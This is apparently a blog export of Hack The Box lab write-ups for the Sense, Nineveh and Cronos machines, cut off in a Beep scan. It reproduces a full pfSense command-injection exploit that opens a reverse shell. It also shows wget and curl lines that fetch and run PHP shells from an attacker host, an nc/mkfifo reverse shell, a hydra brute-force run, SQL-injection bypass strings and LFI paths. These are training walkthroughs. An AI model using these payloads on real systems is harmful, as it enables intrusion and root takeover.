|_ssl-date: TLS randomness does not represent time |_http-server-header: lighttpd/1.4.35   Directory Enum 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  /\t200\t7204 index.php\t200\t453 help.php\t200\t453 stats.php\t200\t453 themes\t???\t??? pfsense_ng\t???\t??? javascript\t???\t??? niftyjsCode.js\t200\t5002 csrf\t???\t??? csrf-magic.js\t200\t7511 javascript\t???\t??? jquery.js\t200\t245502 edit.php\t200\t453 license.php\t200\t453 system.php\t200\t453 status.php\t200\t453 changelog.txt\t200\t583 exec.php\t200\t453 graph.php\t200\t453 tree\t200\t8007 tree.js\t200\t5451 wizard.php\t200\t472 pkg.php\t200\t453 installer\t302\t243 index.php\t302\t224 installer.php\t200\t453 xmlrpc.php\t200\t614 reboot.php\t200\t453 interfaces.php\t200\t453 system-users.txt\t200\t394    Potential username: Rohit   Potential password: pfsense_ng , pfsense Correct login info: rohit : pfsense  Exploitation and Privelege Escalation Metasploit 1 2 3  msfconsole search pfsense    I have tried exploit → exploit/unix/http/pfsense_group_member_exec but didn’t work. One reason was because the latest configuration was on 2017 exploit/unix/http/pfsense_group_member_exec worked  1 2 3 4 5 6 7  cd /home/rohit cat user.txt -\u0026gt; ZmxhZ3tOb3RfSW5fSGVyZX0= cd root cat root.txt -\u0026gt; ZmxhZ3tOb3RfSW5fSGVyZX0=   Without Metasploit  https://www.exploit-db.com/exploits/43560  1 2 3  searchsploit 43560 searchsploit   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110  #!/usr/bin/env python3 # Exploit Title: pfSense \u0026lt;= 2.1.3 status_rrd_graph_img.php Command Injection. # Date: 2018-01-12 # Exploit Author: absolomb # Vendor Homepage: https://www.pfsense.org/ # Software Link: https://atxfiles.pfsense.org/mirror/downloads/old/ # Version: \u0026lt;=2.1.3 # Tested on: FreeBSD 8.3-RELEASE-p16 # CVE : CVE-2014-4688 import argparse import requests import urllib import urllib3 import collections \u0026#39;\u0026#39;\u0026#39; pfSense \u0026lt;= 2.1.3 status_rrd_graph_img.php Command Injection. This script will return a reverse shell on specified listener address and port. Ensure you have started a listener to catch the shell before running! \u0026#39;\u0026#39;\u0026#39; parser = argparse.ArgumentParser() parser.add_argument(\u0026#34;--rhost\u0026#34;, help = \u0026#34;Remote Host\u0026#34;) parser.add_argument(\u0026#39;--lhost\u0026#39;, help = \u0026#39;Local Host listener\u0026#39;) parser.add_argument(\u0026#39;--lport\u0026#39;, help = \u0026#39;Local Port listener\u0026#39;) parser.add_argument(\u0026#34;--username\u0026#34;, help = \u0026#34;pfsense Username\u0026#34;) parser.add_argument(\u0026#34;--password\u0026#34;, help = \u0026#34;pfsense Password\u0026#34;) args = parser.parse_args() rhost = args.rhost lhost = args.lhost lport = args.lport username = args.username password = args.password # command to be converted into octal command = \u0026#34;\u0026#34;\u0026#34; python -c \u0026#39;import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\u0026#34;%s\u0026#34;,%s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; \u0026#34;\u0026#34;\u0026#34; % (lhost, lport) payload = \u0026#34;\u0026#34; # encode payload in octal for char in command: payload += (\u0026#34;\\\\\u0026#34; + oct(ord(char)).lstrip(\u0026#34;0o\u0026#34;)) login_url = \u0026#39;https://\u0026#39; + rhost + \u0026#39;/index.php\u0026#39; exploit_url = \u0026#34;https://\u0026#34; + rhost + \u0026#34;/status_rrd_graph_img.php?database=queues;\u0026#34;+\u0026#34;printf+\u0026#34; + \u0026#34;\u0026#39;\u0026#34; + payload + \u0026#34;\u0026#39;|sh\u0026#34; headers = [ (\u0026#39;User-Agent\u0026#39;,\u0026#39;Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0\u0026#39;), (\u0026#39;Accept\u0026#39;, \u0026#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\u0026#39;), (\u0026#39;Accept-Language\u0026#39;, \u0026#39;en-US,en;q=0.5\u0026#39;), (\u0026#39;Referer\u0026#39;,login_url), (\u0026#39;Connection\u0026#39;, \u0026#39;close\u0026#39;), (\u0026#39;Upgrade-Insecure-Requests\u0026#39;, \u0026#39;1\u0026#39;), (\u0026#39;Content-Type\u0026#39;, \u0026#39;application/x-www-form-urlencoded\u0026#39;) ] # probably not necessary but did it anyways headers = collections.OrderedDict(headers) # Disable insecure https connection warning urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) client = requests.session() # try to get the login page and grab the csrf token try: login_page = client.get(login_url, verify=False) index = login_page.text.find(\u0026#34;csrfMagicToken\u0026#34;) csrf_token = login_page.text[index:index+128].split(\u0026#39;\u0026#34;\u0026#39;)[-1] except: print(\u0026#34;Could not connect to host!\u0026#34;) exit() # format login variables and data if csrf_token: print(\u0026#34;CSRF token obtained\u0026#34;) login_data = [(\u0026#39;__csrf_magic\u0026#39;,csrf_token), (\u0026#39;usernamefld\u0026#39;,username), (\u0026#39;passwordfld\u0026#39;,password), (\u0026#39;login\u0026#39;,\u0026#39;Login\u0026#39;) ] login_data = collections.OrderedDict(login_data) encoded_data = urllib.parse.urlencode(login_data) # POST login request with data, cookies and header login_request = client.post(login_url, data=encoded_data, cookies=client.cookies, headers=headers) else: print(\u0026#34;No CSRF token!\u0026#34;) exit() if login_request.status_code == 200: print(\u0026#34;Running exploit...\u0026#34;) # make GET request to vulnerable url with payload. Probably a better way to do this but if the request times out then most likely you have caught the shell try: exploit_request = client.get(exploit_url, cookies=client.cookies, headers=headers, timeout=5) if exploit_request.status_code: print(\u0026#34;Error running exploit\u0026#34;) except: print(\u0026#34;Exploit completed\u0026#34;)   1  nc -lvnp 1234   1  python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.4 --lport 1234 --username rohit --password pfsense   Skills Learned  Modifying publicly available exploits Bypassing strict filtering Exploiting PFSense  ","description":"Sense, while not requiring many steps to complete, can be challenging for some as the proof of concept exploit that is publicly available is very unreliable. An alternate method using the same vulnerability is required to successfully gain access.","id":15,"section":"posts","tags":["OSCP","linux","freebsd","php","lighthttpd","rce","pfsense"],"title":"Hackthebox - Sense","uri":"https://hswootan.github.io/en/posts/sense/"},{"content":"\r\rEnumeration 1  nmap -sV -sC -O -vv 10.10.10.43 -oA nineveh   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn\u0026#39;t have a title (text/html). | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD |_http-server-header: Apache/2.4.18 (Ubuntu) 443/tcp open ssl/http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) | ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR/emailAddress=admin@nineveh.htb/organizationalUnitName=Support/localityName=Athens | Issuer: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR/emailAddress=admin@nineveh.htb/organizationalUnitName=Support/localityName=Athens | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2017-07-01T15:03:30 | Not valid after: 2018-07-01T15:03:30 | MD5: d182 94b8 0210 7992 bf01 e802 b26f 8639 | SHA-1: 2275 b03e 27bd 1226 fdaa 8b0f 6de9 84f0 113b 42c0 | -----BEGIN CERTIFICATE----- | MIID+TCCAuGgAwIBAgIJANwojrkai1UOMA0GCSqGSIb3DQEBCwUAMIGSMQswCQYD | VQQGEwJHUjEPMA0GA1UECAwGQXRoZW5zMQ8wDQYDVQQHDAZBdGhlbnMxFzAVBgNV | BAoMDkhhY2tUaGVCb3ggTHRkMRAwDgYDVQQLDAdTdXBwb3J0MRQwEgYDVQQDDAtu | aW5ldmVoLmh0YjEgMB4GCSqGSIb3DQEJARYRYWRtaW5AbmluZXZlaC5odGIwHhcN | MTcwNzAxMTUwMzMwWhcNMTgwNzAxMTUwMzMwWjCBkjELMAkGA1UEBhMCR1IxDzAN | BgNVBAgMBkF0aGVuczEPMA0GA1UEBwwGQXRoZW5zMRcwFQYDVQQKDA5IYWNrVGhl | Qm94IEx0ZDEQMA4GA1UECwwHU3VwcG9ydDEUMBIGA1UEAwwLbmluZXZlaC5odGIx | IDAeBgkqhkiG9w0BCQEWEWFkbWluQG5pbmV2ZWguaHRiMIIBIjANBgkqhkiG9w0B | AQEFAAOCAQ8AMIIBCgKCAQEA+HUDrGgG769A68bslDXjV/uBaw18SaF52iEz/ui2 | WwXguHnY8BS7ZetS4jAso6BOrGUZpN3+278mROPa4khQlmZ09cj8kQ4k7lOIxSlp | eZxvt+R8fkJvtA7e47nvwP4H2O6SI0nD/pGDZc05i842kOc/8Kw+gKkglotGi8ZO | GiuRgzyfdaNSWC7Lj3gTjVMCllhc6PgcQf9r7vK1KPkyFleYDUwB0dwf3taN0J2C | U2EHz/4U1l40HoIngkwfhFI+2z2J/xx2JP+iFUcsV7LQRw0x4g6Z5WFWETluWUHi | AWUZHrjMpMaXs3TZNNW81tWUP2jBulX5kv6H5CTocsXgyQIDAQABo1AwTjAdBgNV | HQ4EFgQUh0YSfVOI05WyOFntGykwc3/OzrMwHwYDVR0jBBgwFoAUh0YSfVOI05Wy | OFntGykwc3/OzrMwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAehma | AJKuLeAHqHAIcLopQg9mE28lYDGxf+3eIEuUAHmUKs0qGLs3ZTY8J77XTxmjvH1U | qYVXfZSub1IG7LgUFybLFKNl6gioKEPXXA9ofKdoJX6Bar/0G/15YRSEZGc9WXh4 | Xh1Qr3rkYYZj/rJa4H5uiWoRFofSTNGMfbY8iF8X2+P2LwyEOqThypdMBKMiIt6d | 7sSuqsrnQRa73OdqdoCpHxEG6antne6Vvz3ALxv4cI7SqzKiQvH1zdJ/jOhZK1g1 | CxLUGYbNsjIJWSdOoSlIgRswnu+A+O612+iosxYaYdCUZ8BElgjUAXLEHzuUFtRb | KrYQgX28Ulf8OSGJuA== |_-----END CERTIFICATE----- |_http-title: Site doesn\u0026#39;t have a title (text/html). | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time |_http-server-header: Apache/2.4.18 (Ubuntu) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete   Directory Enum 1 2 3 4 5  dirb http://10.10.10.43/ + http://10.10.10.43/index.html (CODE:200|SIZE:178) + http://10.10.10.43/info.php (CODE:200|SIZE:83767) + http://10.10.10.43/server-status (CODE:403|SIZE:299)   1 2 3 4 5  dirb https://10.10.10.43/ ==\u0026gt; DIRECTORY: https://10.10.10.43/db/ + https://10.10.10.43/index.html (CODE:200|SIZE:49) + https://10.10.10.43/server-status (CODE:403|SIZE:300)   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  gobuster dir -u http://10.10.10.43/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.43/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/02/22 20:17:21 Starting gobuster in directory enumeration mode =============================================================== /department   Dirbuster Brute force -\u0026gt; /department 1 2 3 4 5  hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form \u0026#34;/department/login.php:username=^USER^\u0026amp;password=^PASS^:Invalid Password\\!\u0026#34; # \\ -\u0026gt; escaping the the ! character -\u0026gt; login: admin | password: 1q2w3e4r5t -\u0026gt; http://10.10.10.43/department/login.php -\u0026gt; [80][http-post-form] host: 10.10.10.43 login: admin password: 1q2w3e4r5t   login: admin | password: 1q2w3e4r5t\nLFI  https://www.exploit-db.com/exploits/24044 After getting access into → http://10.10.10.43/department Found LFI in notes=files/ninevehNotes.txt   Create a New Database hack.php Create a new table and insert a text field with default value:  We can rename the database to ninevehNotes.php Visiting → notes=/var/tmp/ninevehNotes.php  1  http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd   Exploitation Reverse Shell 1 2 3 4 5 6 7 8 9 10 11  locate php revese cp /usr/share/webshells/php/php-reverse-shell.php ./ mv php-reverse-shell.php shell.txt # Modify php shell with correct IP nc -lvnp 1234 python -m SimpleHTTPServer    Edit the table with the following  1  \u0026lt;?php system(\u0026#34;wget http://10.10.14.38:8000/shell.txt -O /tmp/shell.php; php /tmp/shell.php\u0026#34;); ?\u0026gt;   1 2  # Fire the shell by visiting the url http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.php   Interactive Shell 1 2 3 4 5 6 7 8 9 10 11 12  which python which python3 python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; CTRL + Z stty raw -echo fg [Press Enter] export TERM=screen   Privelege Escalation  There is a report folder  1  ps aux    Found sshd but there was no ssh during nmap  1 2 3  ls /usr/sbin -\u0026gt; knock -\u0026gt; chroot    Google chkrootkit → https://www.exploit-db.com/exploits/33899  1  www-data@nineveh$ cd /tmp # upload executable reverse shell   1 2 3 4 5  nano update rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.50 9000 \u0026gt;/tmp/f nc -lvnp 9000   1 2  www-data@nineveh:/tmp$ wget http://10.10.14.50:8000/update chmod +x update   Port Knocking 1 2 3  # Running the LinEnum.sh on the attacking machine curl 10.10.14.38:8000/LinEnum.sh | bash    There was no port 22 in port enumeration https://github.com/grongor/knock  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  locate knockd -\u0026gt; /etc/knockd.conf /etc/default/knockd /etc/init.d/knockd cat /etc/knockd.conf -\u0026gt; logfile = /var/log/knockd.log interface = ens160 [openSSH] sequence = 571, 290, 911 seq_timeout = 5 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 911,290,571 seq_timeout = 5 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn    Sequence 571, 290, 911  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  for x in 571 290 911; do nmap -Pn --max-retries 0 -p $x 10.10.10.43; done ------------------------------------------------------------ PORT STATE SERVICE 571/tcp filtered umeter Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-25 16:08 EST Warning: 10.10.10.43 giving up on port because retransmission cap hit (0). Nmap scan report for 10.10.10.43 Host is up. PORT STATE SERVICE 290/tcp filtered unknown Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-25 16:08 EST Warning: 10.10.10.43 giving up on port because retransmission cap hit (0). Nmap scan report for 10.10.10.43 Host is up. PORT STATE SERVICE 911/tcp filtered xact-backup ------------------------------------------------------------   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  # in the nmap scan we found a private certificate nano id_rsa | -----BEGIN CERTIFICATE----- | MIID+TCCAuGgAwIBAgIJANwojrkai1UOMA0GCSqGSIb3DQEBCwUAMIGSMQswCQYD | VQQGEwJHUjEPMA0GA1UECAwGQXRoZW5zMQ8wDQYDVQQHDAZBdGhlbnMxFzAVBgNV | BAoMDkhhY2tUaGVCb3ggTHRkMRAwDgYDVQQLDAdTdXBwb3J0MRQwEgYDVQQDDAtu | aW5ldmVoLmh0YjEgMB4GCSqGSIb3DQEJARYRYWRtaW5AbmluZXZlaC5odGIwHhcN | MTcwNzAxMTUwMzMwWhcNMTgwNzAxMTUwMzMwWjCBkjELMAkGA1UEBhMCR1IxDzAN | BgNVBAgMBkF0aGVuczEPMA0GA1UEBwwGQXRoZW5zMRcwFQYDVQQKDA5IYWNrVGhl | Qm94IEx0ZDEQMA4GA1UECwwHU3VwcG9ydDEUMBIGA1UEAwwLbmluZXZlaC5odGIx | IDAeBgkqhkiG9w0BCQEWEWFkbWluQG5pbmV2ZWguaHRiMIIBIjANBgkqhkiG9w0B | AQEFAAOCAQ8AMIIBCgKCAQEA+HUDrGgG769A68bslDXjV/uBaw18SaF52iEz/ui2 | WwXguHnY8BS7ZetS4jAso6BOrGUZpN3+278mROPa4khQlmZ09cj8kQ4k7lOIxSlp | eZxvt+R8fkJvtA7e47nvwP4H2O6SI0nD/pGDZc05i842kOc/8Kw+gKkglotGi8ZO | GiuRgzyfdaNSWC7Lj3gTjVMCllhc6PgcQf9r7vK1KPkyFleYDUwB0dwf3taN0J2C | U2EHz/4U1l40HoIngkwfhFI+2z2J/xx2JP+iFUcsV7LQRw0x4g6Z5WFWETluWUHi | AWUZHrjMpMaXs3TZNNW81tWUP2jBulX5kv6H5CTocsXgyQIDAQABo1AwTjAdBgNV | HQ4EFgQUh0YSfVOI05WyOFntGykwc3/OzrMwHwYDVR0jBBgwFoAUh0YSfVOI05Wy | OFntGykwc3/OzrMwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAehma | AJKuLeAHqHAIcLopQg9mE28lYDGxf+3eIEuUAHmUKs0qGLs3ZTY8J77XTxmjvH1U | qYVXfZSub1IG7LgUFybLFKNl6gioKEPXXA9ofKdoJX6Bar/0G/15YRSEZGc9WXh4 | Xh1Qr3rkYYZj/rJa4H5uiWoRFofSTNGMfbY8iF8X2+P2LwyEOqThypdMBKMiIt6d | 7sSuqsrnQRa73OdqdoCpHxEG6antne6Vvz3ALxv4cI7SqzKiQvH1zdJ/jOhZK1g1 | CxLUGYbNsjIJWSdOoSlIgRswnu+A+O612+iosxYaYdCUZ8BElgjUAXLEHzuUFtRb | KrYQgX28Ulf8OSGJuA== |_-----END CERTIFICATE-----   1 2 3  git clone https://github.com/grongor/knock python3 knock 10.10.10.43 571 290 911   Skills Learned  HTTP-based brute forcing Chaining exploits Local file inclusion Port knocking  ","description":"Nineveh is not overly challenging, however several exploits must be chained to gain initial access. Several uncommon services are running on the machine and some research is required to enumerate them","id":16,"section":"posts","tags":["OSCP","linux","apache","brute force attack","cve","phpliteadmin","weak credentials","chkrootkit","lfi","kernel","system exploitation","port knocking"],"title":"Hackthebox - Nineveh","uri":"https://hswootan.github.io/en/posts/nineveh/"},{"content":"\r\rEnumeration 1  nmap -sV -sC -O -vv 10.10.10.13 -oA cronos   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkOUbDfxsLPWvII72vC7hU4sfLkKVEqyHRpvPWV2+5s2S4kH0rS25C/R+pyGIKHF9LGWTqTChmTbcRJLZE4cJCCOEoIyoeXUZWMYJCqV8crflHiVG7Zx3wdUJ4yb54G6NlS4CQFwChHEH9xHlqsJhkpkYEnmKc+CvMzCbn6CZn9KayOuHPy5NEqTRIHObjIEhbrz2ho8+bKP43fJpWFEx0bAzFFGzU0fMEt8Mj5j71JEpSws4GEgMycq4lQMuw8g6Acf4AqvGC5zqpf2VRID0BDi3gdD1vvX2d67QzHJTPA5wgCk/KzoIAovEwGqjIvWnTzXLL8TilZI6/PV8wPHzn | 256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKWsTNMJT9n5sJr5U1iP8dcbkBrDMs4yp7RRAvuu10E6FmORRY/qrokZVNagS1SA9mC6eaxkgW6NBgBEggm3kfQ= | 256 1a:0e:e7:ba:00:cc:02:01:04💿a3:a9:3f:5e:22:20 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBIQsAL/XR/HGmUzGZgRJe/1lQvrFWnODXvxQ1Dc+Zx 53/tcp open domain syn-ack ttl 63 ISC BIND 9.10.3-P4 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.10.3-P4-Ubuntu 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.18 (Ubuntu)    Nothing interesting in port 80 We see DNS on port 53 we can further enumerate DNS  Zone Transfer 1  dig axfr cronos.htb @10.10.10.13   1  host -l cronos.htb 10.10.10.13   1 2 3 4 5 6 7 8 9 10 11 12 13  \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.17.20-3-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr cronos.htb @10.10.10.13 ;; global options: +cmd cronos.htb. 604800 IN SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800 cronos.htb. 604800 IN NS ns1.cronos.htb. cronos.htb. 604800 IN A 10.10.10.13 admin.cronos.htb. 604800 IN A 10.10.10.13 ns1.cronos.htb. 604800 IN A 10.10.10.13 www.cronos.htb. 604800 IN A 10.10.10.13 cronos.htb. 604800 IN SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800 ;; Query time: 24 msec ;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP) ;; WHEN: Thu Feb 10 18:54:40 EST 2022 ;; XFR size: 7 records (messages 1, bytes 203)   1  nano /etc/hosts    Can go to → http://cronos.htb Can go to →http://admin.cronos.htb/  SQL Injection Auth bypass  SQL Inject the login page  SQL Injection cheat sheet →https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/    1 2 3 4 5 6  # Worked with admin\u0026#39; # UserName: admin\u0026#39; # Password: admin\u0026#39; #   Exploitation  The search traceroute is injectable  1  8.8.8.8; ls -al   1 2  8.8.8.8; cat /home/noulis/user.txt -\u0026gt; user.txt -\u0026gt; ********************************    Found something in admin  1 2 3 4 5 6 7 8 9 10  cd admin cat config.php -\u0026gt; \u0026lt;?php define(\u0026#39;DB_SERVER\u0026#39;, \u0026#39;localhost\u0026#39;); define(\u0026#39;DB_USERNAME\u0026#39;, \u0026#39;admin\u0026#39;); define(\u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;kEjdbRigfBHUREiNSDs\u0026#39;); define(\u0026#39;DB_DATABASE\u0026#39;, \u0026#39;admin\u0026#39;); $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE); ?\u0026gt;   Privilege Escalation Cronjobs 1 2 3 4 5 6 7  cat /etc/crontab -\u0026gt; # m h dom mon dow user command 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) * * * * * root php /var/www/laravel/artisan schedule:run \u0026gt;\u0026gt; /dev/null 2\u0026gt;\u0026amp;1   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71  # We can use php reverse shell but we need to delete what is in the schedule run by running cd /var/www/laravel/ cat artisan #!/usr/bin/env php \u0026lt;?php /* |-------------------------------------------------------------------------- | Register The Auto Loader |-------------------------------------------------------------------------- | | Composer provides a convenient, automatically generated class loader | for our application. We just need to utilize it! We\u0026#39;ll require it | into the script here so that we do not have to worry about the | loading of any our classes \u0026#34;manually\u0026#34;. Feels great to relax. | */ require __DIR__.\u0026#39;/bootstrap/autoload.php\u0026#39;; $app = require_once __DIR__.\u0026#39;/bootstrap/app.php\u0026#39;; /* |-------------------------------------------------------------------------- | Run The Artisan Application |-------------------------------------------------------------------------- | | When we run the console application, the current CLI command will be | executed in this console and the response sent back to a terminal | or another output device for the developers. Here goes nothing! | */ $kernel = $app-\u0026gt;make(Illuminate\\Contracts\\Console\\Kernel::class); $status = $kernel-\u0026gt;handle( $input = new Symfony\\Component\\Console\\Input\\ArgvInput, new Symfony\\Component\\Console\\Output\\ConsoleOutput ); /* |-------------------------------------------------------------------------- | Shutdown The Application |-------------------------------------------------------------------------- | | Once Artisan has finished running. We will fire off the shutdown events | so that any final work may be done by the application before we shut | down the process. This is the last thing to happen to the request. | */ $kernel-\u0026gt;terminate($input, $status); exit($status); cat /dev/null \u0026gt; artisan locate php reverse cp /usr/share/webshells/php/php-reverse-shell.php ./ mv php-reverse-shell.php rev.php # Modify the php-reverse-shell with the correct values python -m SimpleHTTPServer wget   Reverse shell 1 2 3 4 5 6  which wget -\u0026gt; /usr/bin/wget wget 10.10.14.50:8000/rev.php ./ # Transfer the php reverse payload to the attacking machine cp rev.php artisan # Wait for the reverse shell     We are root  1 2 3  cd root cat root.txt -\u0026gt; ********************************   Another way to get Root by uploading the php reverse shell 1 2 3 4 5 6 7 8 9 10 11  cat /etc/crontab cat /dev/null # delete what it is in the file cd /home/sake/HTB/oscp_boxes/cronos #  python -m SimpleHTTPServer echo \u0026#34;\u0026lt;?php system(\u0026#39;curl http://10.10.14.50:8000/rev.php | php\u0026#39;)?\u0026gt;\u0026#34; \u0026gt; artisan cat cartisan # wait 30 secs and will get root   Skills Learned  SQL Injection Command injection Exploiting cron jobs  ","description":"CronOS focuses mainly on different vectors for enumeration and also emphasises the risks associated with adding world-writable files to the root crontab. This machine also includes an introductory-level SQL injection vulnerability.","id":17,"section":"posts","tags":["OSCP","linux","php","apache","os command injection","cve","deserialization","ssh","dns","sql injection","crontab"],"title":"Hackthebox - Cronos","uri":"https://hswootan.github.io/en/posts/cronos/"},{"content":"\r\rEnumeration 1  nmap -sV -sC -O -vv 10.10.10.7 -oA beep   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104  Host is up, received reset ttl 63 (0.019s latency). Scanned at 2022-02-09 09:23:48 EST for 396s Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 4.3 (protocol 2.0) | ssh-hostkey: | 1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA) | ssh-dss AAAAB3NzaC1kc3MAAACBAI04jN+Sn7/9f2k+5UteAWn8KKj3FRGuF4LyeDmo/xxuHgSsdCjYuWtNS8m7stqgNH5edUu8vZ0pzF/quX5kphWg/UOz9weGeGyzde5lfb8epRlTQ2kfbP00l+kq9ztuWaXOsZQGcSR9iKE4lLRJhRCLYPaEbuxKnYz4WhAv4yD5AAAAFQDXgQ9BbvoxeDahe/ksAac2ECqflwAAAIEAiGdIue6mgTfdz/HikSp8DB6SkVh4xjpTTZE8L/HOVpTUYtFYKYj9eG0W1WYo+lGg6SveATlp3EE/7Y6BqdtJNm0RfR8kihoqSL0VzKT7myerJWmP2EavMRPjkbXw32fVBdCGjBqMgDl/QSEn2NNDu8OAyQUVBEHrE4xPGI825qgAAACANnqx2XdVmY8agjD7eFLmS+EovCIRz2+iE+5chaljGD/27OgpGcjdZNN+xm85PPFjUKJQuWmwMVTQRdza6TSp9vvQAgFh3bUtTV3dzDCuoR1D2Ybj9p/bMPnyw62jgBPxj5lVd27LTBi8IAH2fZnct7794Y3Ge+5r4Pm8Qbrpy68= | 2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA) |_ssh-rsa 